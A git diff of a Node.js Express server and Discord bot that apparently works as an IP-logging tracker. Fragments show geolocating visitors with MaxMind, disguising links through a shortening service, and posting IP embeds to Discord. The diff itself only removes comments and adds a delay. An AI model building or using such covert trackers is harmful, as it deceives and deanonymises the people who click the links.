@@ -35,7 +35,6 @@ const maxmind = require('maxmind');
   lookup = await maxmind.open('./GeoLite2-City.mmdb');
 })();
 
-// Fonction pour raccourcir avec serveur shortlink
 async function shortenWithInstantMediaShare(longUrl, customCode) {
   try {
     const response = await axios.post('https://instantmedia-share.onrender.com/shorten', {
@@ -49,7 +48,6 @@ async function shortenWithInstantMediaShare(longUrl, customCode) {
   }
 }
 
-// Fonction commune pour envoyer un embed IP
 async function logIp(req, res, redirectUrl = null) {
   const u = req.query.u;
   if (!u) return res.redirect('https://google.com');
@@ -128,7 +126,6 @@ async function logIp(req, res, redirectUrl = null) {
   }
 }
 
-// Express Route
 app.get('/:type', async (req, res) => {
   const { type } = req.params;
 
@@ -143,8 +140,6 @@ app.get('/:type', async (req, res) => {
 app.listen(port, () => {
   console.log(`🚀 Serveur Express actif sur le port ${port}`);
 });
-
-// --- DISCORD BOT ---
 
 const client = new Client({
   intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages],
@@ -209,6 +204,8 @@ client.on(Events.InteractionCreate, async interaction => {
         { id: client.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.EmbedLinks, PermissionsBitField.Flags.AttachFiles, PermissionsBitField.Flags.ManageChannels] }
       ]
     });
+
+    await new Promise(resolve => setTimeout(resolve, 1000));
 
     const select = new StringSelectMenuBuilder()
       .setCustomId('select_tracker_type')
